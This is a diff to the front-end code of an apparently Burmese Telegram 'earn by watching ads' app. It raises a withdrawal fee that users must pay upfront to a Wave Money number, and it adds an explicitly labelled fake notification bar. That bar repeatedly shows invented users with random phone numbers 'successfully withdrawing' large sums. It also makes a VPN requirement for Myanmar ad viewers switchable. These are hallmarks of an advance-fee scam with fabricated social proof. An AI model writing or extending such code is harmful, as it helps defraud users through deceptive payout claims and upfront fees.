@@ -196,7 +196,7 @@
       <!-- Notice -->
       <div class="bg-blue-50 rounded-xl p-3 border border-blue-100 mb-4 flex gap-2.5">
         <i class="fas fa-info-circle text-blue-400 mt-0.5 flex-shrink-0 text-sm"></i>
-        <p class="text-xs text-blue-700 mm">အနည်းဆုံး <strong>50,000 MMK</strong> ရှိမှ ထုတ်နိုင်သည်။ Admin စစ်ဆေးပြီးနောက် ငွေလွှဲပေးမည်။</p>
+        <p class="text-xs text-blue-700 mm">အနည်းဆုံး <strong id="wdMinNote">50,000 MMK</strong> ရှိမှ ထုတ်နိုင်သည်။ Admin စစ်ဆေးပြီးနောက် ငွေလွှဲပေးမည်။</p>
       </div>
 
       <!-- Balance row -->
@@ -440,7 +440,7 @@
     <!-- Fee Info -->
     <div class="bg-red-50 rounded-xl p-3 border border-red-200 mb-3 text-xs mm space-y-1.5">
       <div class="font-bold text-red-700 flex items-center gap-1.5"><i class="fas fa-exclamation-triangle"></i> ကြေးပေးချေနည်း</div>
-      <div class="text-gray-600">ငွေထုတ်ခြင်းအတွက် ကြေး <strong class="text-red-700">2,000 ကျပ်</strong> ကိုအရင်ပေးပါ</div>
+      <div class="text-gray-600">ငွေထုတ်ခြင်းအတွက် ကြေး <strong class="text-red-700" id="feeAmountText">5,000 ကျပ်</strong> ကိုအရင်ပေးပါ</div>
       <div class="bg-white rounded-lg p-2 border border-red-100 space-y-1">
         <div class="font-bold text-gray-700">🌊 Wave Money</div>
         <div class="text-gray-600">နံပါတ် : <strong class="text-purple-700 select-all">09790611406</strong></div>
@@ -493,6 +493,24 @@
   </div>
 </div>
 
+<!-- ===== FAKE WITHDRAWAL NOTIFICATION BAR ===== -->
+<div id="fakeWdBar" style="
+  position:fixed; bottom:72px; left:50%; transform:translateX(-50%) translateY(120%);
+  z-index:85; width:calc(100% - 32px); max-width:420px;
+  background:linear-gradient(135deg,#1a1a2e,#16213e);
+  border:1px solid rgba(168,85,247,0.4); border-radius:14px;
+  padding:10px 14px; display:flex; align-items:center; gap:10px;
+  box-shadow:0 8px 32px rgba(0,0,0,0.4);
+  transition: transform 0.5s cubic-bezier(0.34,1.56,0.64,1), opacity 0.5s ease;
+  opacity:0; pointer-events:none;">
+  <div style="width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,#a855f7,#ec4899);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:14px;">💸</div>
+  <div style="flex:1;min-width:0;">
+    <div id="fakeWdText" style="font-size:12px;color:#e2e8f0;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;"></div>
+    <div style="font-size:10px;color:#a855f7;margin-top:1px;">✅ ငွေထုတ်ယူမှု အောင်မြင်ပြီးပါပြီ</div>
+  </div>
+  <div style="font-size:10px;color:#6b7280;flex-shrink:0;">ယခုတင်</div>
+</div>
+
 <!-- ===== TOAST ===== -->
 <div id="toastEl" class="fixed top-20 left-1/2 -translate-x-1/2 z-[90] transition-all duration-300 opacity-0 pointer-events-none">
   <div class="bg-gray-900/90 backdrop-blur-md text-white px-4 py-2 sm:px-5 sm:py-2.5 rounded-full shadow-xl flex items-center gap-2 text-xs sm:text-sm font-medium border border-white/20 whitespace-nowrap">
@@ -513,6 +531,34 @@ const MINE_RATE     = 1000;
 const TASK_ICONS    = ['fas fa-play','fas fa-clipboard-list','fas fa-user-friends','fas fa-calendar-check','fas fa-pen-fancy'];
 const TASK_NAMES    = ['တာဝန် ၁','တာဝန် ၂','တာဝန် ၃','တာဝန် ၄','တာဝန် ၅'];
 const MINER_LABELS  = ['Alpha','Beta','Gamma'];
+
+// ── Dynamic settings (loaded from backend) ─────────────────
+let appSettings = { vpnRequired: false, minWithdrawal: 50000, withdrawalFee: 5000 };
+
+async function loadSettings() {
+  try {
+    const r = await fetch(API_BASE + '/settings/public');
+    if (r.ok) {
+      const d = await r.json();
+      appSettings = { ...appSettings, ...d };
+      applySettingsToUI();
+    }
+  } catch { /* use defaults */ }
+}
+
+function applySettingsToUI() {
+  const fee = appSettings.withdrawalFee;
+  const min = appSettings.minWithdrawal;
+  // Update fee modal text
+  const feeAmtEl = document.getElementById('feeAmountText');
+  if (feeAmtEl) feeAmtEl.textContent = fee.toLocaleString() + ' ကျပ်';
+  // Update withdrawal placeholder
+  const wdInput = document.getElementById('wdAmount');
+  if (wdInput) wdInput.placeholder = min.toLocaleString() + ' အနည်းဆုံး';
+  // Update withdraw page note
+  const wdMinNote = document.getElementById('wdMinNote');
+  if (wdMinNote) wdMinNote.textContent = 'အနည်းဆုံး ' + min.toLocaleString() + ' ကျပ်';
+}
 
 const tg         = window.Telegram?.WebApp;
 if (tg) { tg.expand(); tg.ready(); }
@@ -933,14 +979,15 @@ async function watchAd(taskId) {
   const btn = document.getElementById('taskBtn-' + taskId);
   if (btn) { btn.disabled = true; btn.querySelector('span').textContent = 'loading...'; }
 
-  // Check if Myanmar location — block ad
+  // Check VPN requirement from backend settings
   try {
-    const isMM = await checkMyanmarLocation();
-    if (isMM) {
-      // Show VPN modal and block
-      document.getElementById('vpnModal').style.display = 'flex';
-      if (btn) { btn.disabled = false; btn.querySelector('span').textContent = 'ကြည့်မည်'; }
-      return;
+    if (appSettings.vpnRequired) {
+      const isMM = await checkMyanmarLocation();
+      if (isMM) {
+        document.getElementById('vpnModal').style.display = 'flex';
+        if (btn) { btn.disabled = false; btn.querySelector('span').textContent = 'ကြည့်မည်'; }
+        return;
+      }
     }
   } catch { /* ignore geo check errors */ }
 
@@ -1002,7 +1049,10 @@ function submitWithdraw() {
   const amount = document.getElementById('wdAmount').value;
   const acNum  = document.getElementById('wdAccNum').value.trim();
   const acName = document.getElementById('wdAccName').value.trim();
-  if (!amount || Number(amount) < 50000)         { showToast('❌ အနည်းဆုံး 50,000 ကျပ် ထုတ်ရပါမည်', 'error'); return; }
+  const min    = appSettings.minWithdrawal || 50000;
+  if (!amount || Number(amount) < min) {
+    showToast(`❌ အနည်းဆုံး ${min.toLocaleString()} ကျပ် ထုတ်ရပါမည်`, 'error'); return;
+  }
   if (!acNum)                                    { showToast('❌ အကောင့်နံပါတ် ထည့်ပါ', 'error'); return; }
   if (Number(amount) > (userData?.balance || 0)) { showToast('❌ လက်ကျန်ငွေ မလောက်ပါ', 'error'); return; }
 
@@ -1160,11 +1210,73 @@ function createConfetti() {
 }
 
 // ====================================================
+// FAKE WITHDRAWAL NOTIFICATION BAR
+// ====================================================
+(function() {
+  const NAMES = [
+    'သိမ့်ဇာ','ပွင့်ဖြူ','နန်းထားသူ','မိုးကြည်','ဆုမြတ်နိုး','ရွှေပျံ','ခင်မျိုးသူ',
+    'နဒီမြတ်','ဝေဠုနိုး','သူဇာ','မေသူ','ရောင်ခြည်','ငြိမ်းချမ်းသူ','ဇာနည်','နန်းဆုဝေ',
+    'ပြည့်ဖြိုးသော','ကြည်ဖြူ','အေးမြ','မြတ်ဝေ','ဝတ်မှုန်','ဆုသာ','ကံကောင်း','ပုလဲ',
+    'မင်းကျော်ဇင်','ကျော်စိုးနိုင်','ဇေယျာလင်း','မင်းသန့်','ကောင်းခန့်','ဟိန်းမင်း',
+    'ထွန်းထွန်း','ဇော်မင်းထွဋ်','ကျော်ကျော်','ဝေလင်းအောင်','ဆန်းမင်း','ဖြိုးနိုင်',
+    'ငြိမ်းချမ်း','ကောင်းထက်','အောင်ကျော်','မျိုးနိုင်','သက်ဝေ','ပြည့်ဖြိုး',
+    'ဂျူးဂျူး','ယမင်းနိုး','ဘုန်းကျော်','ဆုနိုင်','ကမ်းမြောက်','ဝါဝါ','ဧဧ',
+    'ခင်ဝတ်မှုန်','မြသူ'
+  ];
+  const PHONES = [
+    '09797XXXX','09791XXXX','09799XXXX','09776XXXX','09788XXXX',
+    '09260XXXX','09261XXXX','09262XXXX','09977XXXX','09978XXXX',
+    '09422XXXX','09430XXXX','09448XXXX','09450XXXX','09773XXXX',
+    '09765XXXX','09758XXXX','09751XXXX','09746XXXX','09732XXXX',
+    '09725XXXX','09710XXXX','09699XXXX','09680XXXX','09671XXXX',
+    '09660XXXX','09656XXXX','09643XXXX','09637XXXX','09620XXXX'
+  ];
+  const AMOUNTS = [50000,75000,100000,150000,200000,250000,300000];
+
+  function randomItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+
+  function maskPhone(p) {
+    // Show first 6 digits, mask last 4 with xxx
+    const base = p.replace('XXXX', Math.floor(1000+Math.random()*9000));
+    return base.slice(0, 7) + 'xxx' + base.slice(-2);
+  }
+
+  function showFakeWd() {
+    const name   = randomItem(NAMES);
+    const phone  = maskPhone(randomItem(PHONES));
+    const amount = randomItem(AMOUNTS);
+    const bar    = document.getElementById('fakeWdBar');
+    const txt    = document.getElementById('fakeWdText');
+    if (!bar || !txt) return;
+    txt.textContent = `${name} (${phone}) — ${amount.toLocaleString()} ကျပ် ထုတ်ယူပြီး`;
+    // Slide in
+    bar.style.transform = 'translateX(-50%) translateY(0)';
+    bar.style.opacity   = '1';
+    // Slide out after 4s
+    setTimeout(() => {
+      bar.style.transform = 'translateX(-50%) translateY(120%)';
+      bar.style.opacity   = '0';
+    }, 4000);
+  }
+
+  window.startFakeWithdrawNoti = function() {
+    // First show after 8 seconds
+    setTimeout(() => {
+      showFakeWd();
+      // Then every 25-45 seconds randomly
+      setInterval(showFakeWd, 25000 + Math.floor(Math.random() * 20000));
+    }, 8000);
+  };
+})();
+
+// ====================================================
 // INIT
 // ====================================================
 document.addEventListener('DOMContentLoaded', () => {
+  loadSettings();
   loadUser();
   setInterval(loadUser, 30000);
+  startFakeWithdrawNoti();
 });
 </script>
 </body>
